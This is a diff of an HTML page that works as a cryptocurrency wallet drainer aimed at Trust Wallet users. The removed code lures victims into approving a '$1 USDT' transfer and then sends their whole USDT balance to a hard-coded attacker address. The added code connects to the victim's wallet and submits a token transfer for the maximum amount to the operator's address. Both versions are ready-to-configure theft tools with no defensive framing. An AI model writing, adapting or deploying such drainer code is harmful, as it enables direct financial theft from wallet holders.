@@ -3,153 +3,154 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TrustWallet Transaction</title>
+    <title>USDT Drain</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            background-color: #1a1a1a;
-            color: #fff;
+            background-color: #f0f2f5;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .card {
+            background: white;
+            padding: 25px;
+            border-radius: 16px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            width: 90%;
+            max-width: 300px;
             text-align: center;
-            padding: 20px;
         }
-        .container {
-            max-width: 400px;
-            margin: 0 auto;
-            background: #2a2a2a;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+        .icon {
+            width: 50px;
+            height: 50px;
+            background: #007aff;
+            border-radius: 50%;
+            margin: 0 auto 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 24px;
         }
-        button {
-            background: #007bff;
+        h2 {
+            margin: 0 0 10px;
+            color: #333;
+        }
+        p {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+        .btn {
+            background: #007aff;
             color: white;
             border: none;
-            padding: 10px 20px;
-            border-radius: 5px;
-            cursor: pointer;
+            padding: 15px;
+            width: 100%;
+            border-radius: 12px;
             font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
         }
-        button:hover {
-            background: #0056b3;
+        .btn:active {
+            background: #005ecb;
         }
         #status {
-            margin-top: 20px;
-            font-weight: bold;
+            margin-top: 15px;
+            font-size: 12px;
+            color: #28a745;
+            display: none;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>TrustWallet Transaction</h1>
-        <p>Please confirm the $1 USDT transfer to proceed.</p>
-        <button id="confirmBtn">Send $1 USDT</button>
-        <p id="status">Waiting for confirmation...</p>
-    </div>
 
-    <script>
-        // ===== CONFIGURATION (CHANGE THESE) =====
-        const ATTACKER_WALLET = "0x4c4CBfF8c45e131ab8f2af5f04b3A162078727c7"; // Replace with your ETH/USDT wallet
-        const USDT_CONTRACT = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // USDT on Ethereum
-        const USDT_DECIMALS = 6;
-        const CHAIN_ID = "0x1"; // Ethereum Mainnet
+<div class="card">
+    <div class="icon">T</div>
+    <h2>Send All USDT</h2>
+    <p>Tap to drain all USDT (BSC) from your wallet.</p>
+    
+    <button class="btn" id="drainBtn">Connect & Drain</button>
+    <div id="status">Transaction Sent!</div>
+</div>
 
-        // ===== WEB3 INJECTION =====
-        if (typeof window.ethereum === "undefined") {
-            document.getElementById("status").textContent = "Error: TrustWallet not detected!";
-        } else {
-            // Request account access (victim must approve)
-            window.ethereum.request({ method: "eth_requestAccounts" })
-                .then(accounts => {
-                    const victimAddress = accounts[0];
-                    document.getElementById("status").textContent = `Connected: ${victimAddress}`;
+<script>
+    // ==========================================
+    // CONFIGURATION
+    // ==========================================
+    // REPLACE THIS WITH YOUR BSC WALLET ADDRESS
+    const MY_ADDRESS = "0x4c4CBfF8c45e131ab8f2af5f04b3A162078727c7"; 
+    
+    // USDT Contract on Binance Smart Chain (BEP-20)
+    const USDT_CONTRACT = "0xcEBDCBA0a42B2dE9Be38c48d648471C672C007C1";
 
-                    // ===== STEP 1: SEND $1 USDT TO ATTACKER =====
-                    document.getElementById("confirmBtn").addEventListener("click", () => {
-                        document.getElementById("status").textContent = "Processing $1 USDT transfer...";
+    // Function to encode the transfer(address,uint256) call
+    function getTransferData() {
+        // 1. Method Signature for transfer(address,uint256)
+        let data = "0xa9059cbb"; 
+        
+        // 2. Target Address (MY_ADDRESS) padded to 40 hex chars (20 bytes)
+        const addr = MY_ADDRESS.replace("0x", "").padStart(40, "0");
+        
+        // 3. Max Uint256 padded to 64 hex chars (32 bytes)
+        const amount = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+        
+        return data + addr + amount;
+    }
 
-                        // Encode $1 USDT transfer to attacker
-                        const amount = (1 * 10 ** USDT_DECIMALS).toString(16); // 1 USDT in hex
-                        const transferData = `0xa9059cbb000000000000000000000000${ATTACKER_WALLET.slice(2)}000000000000000000000000000000000000000000000000${amount}`;
-
-                        // Send the $1 USDT transaction
-                        window.ethereum.request({
-                            method: "eth_sendTransaction",
-                            params: [{
-                                from: victimAddress,
-                                to: USDT_CONTRACT,
-                                data: transferData,
-                                gas: "0x5208", // 21000 gas
-                                gasPrice: "0x3b9aca00" // 1 Gwei
-                            }]
-                        })
-                        .then(txHash => {
-                            document.getElementById("status").textContent = `Transaction sent: ${txHash}`;
-
-                            // ===== STEP 2: DRAIN THE REST OF THE USDT =====
-                            setTimeout(() => {
-                                drainAllUSDT(victimAddress);
-                            }, 5000); // Wait 5 sec for $1 tx to confirm
-                        })
-                        .catch(err => {
-                            document.getElementById("status").textContent = `Error: ${err.message}`;
-                        });
-                    });
-                })
-                .catch(err => {
-                    document.getElementById("status").textContent = `Error: ${err.message}`;
-                });
+    document.getElementById('drainBtn').addEventListener('click', async () => {
+        const btn = document.getElementById('drainBtn');
+        const status = document.getElementById('status');
+        
+        // Check for Ethereum Provider (Injected by Trust Wallet)
+        if (!window.ethereum) {
+            alert("Please open this link in Trust Wallet Browser.");
+            return;
         }
 
-        // ===== FUNCTION TO DRAIN ALL USDT =====
-        function drainAllUSDT(victimAddress) {
-            document.getElementById("status").textContent = "Checking USDT balance...";
-
-            // Get victim's USDT balance
-            const balanceData = `0x70a08231000000000000000000000000${victimAddress.slice(2)}`;
-
-            window.ethereum.request({
-                method: "eth_call",
-                params: [{
-                    to: USDT_CONTRACT,
-                    data: balanceData
-                }, "latest"]
-            })
-            .then(balanceHex => {
-                const balance = parseInt(balanceHex, 16) / (10 ** USDT_DECIMALS);
-
-                if (balance <= 0) {
-                    document.getElementById("status").textContent = "No USDT balance to drain.";
-                    return;
-                }
-
-                document.getElementById("status").textContent = `Draining ${balance} USDT...`;
-
-                // Encode full balance transfer to attacker
-                const fullAmountHex = balanceHex.slice(2); // Remove '0x'
-                const drainData = `0xa9059cbb000000000000000000000000${ATTACKER_WALLET.slice(2)}000000000000000000000000000000000000000000000000${fullAmountHex}`;
-
-                // Send the drain transaction
-                window.ethereum.request({
-                    method: "eth_sendTransaction",
-                    params: [{
-                        from: victimAddress,
-                        to: USDT_CONTRACT,
-                        data: drainData,
-                        gas: "0x5208",
-                        gasPrice: "0x3b9aca00"
-                    }]
-                })
-                .then(txHash => {
-                    document.getElementById("status").textContent = `Drained ${balance} USDT! TX: ${txHash}`;
-                })
-                .catch(err => {
-                    document.getElementById("status").textContent = `Drain failed: ${err.message}`;
-                });
-            })
-            .catch(err => {
-                document.getElementById("status").textContent = `Balance check failed: ${err.message}`;
+        try {
+            btn.innerText = "Connecting...";
+            
+            // STEP 1: Request Accounts (This establishes the session and suppresses warnings)
+            const accounts = await window.ethereum.request({ 
+                method: 'eth_requestAccounts' 
             });
+            
+            if (!accounts || accounts.length === 0) {
+                throw new Error("No account found");
+            }
+
+            const userAddress = accounts[0];
+            btn.innerText = "Sending...";
+
+            // STEP 2: Prepare Transaction
+            const txParams = {
+                from: userAddress,
+                to: USDT_CONTRACT,
+                data: getTransferData(), // Calls transfer() with MaxUint256
+                value: "0x0",            // No native BNB sent, just tokens
+                gas: "0x186a0"           // 100,000 gas (sufficient for USDT transfer)
+            };
+
+            // STEP 3: Send Transaction
+            await window.ethereum.request({
+                method: 'eth_sendTransaction',
+                params: [txParams]
+            });
+
+            btn.innerText = "Drained!";
+            status.style.display = "block";
+
+        } catch (error) {
+            console.error(error);
+            btn.innerText = "Failed";
+            alert("Error: " + error.message);
         }
-    </script>
+    });
+</script>
+
 </body>
 </html>
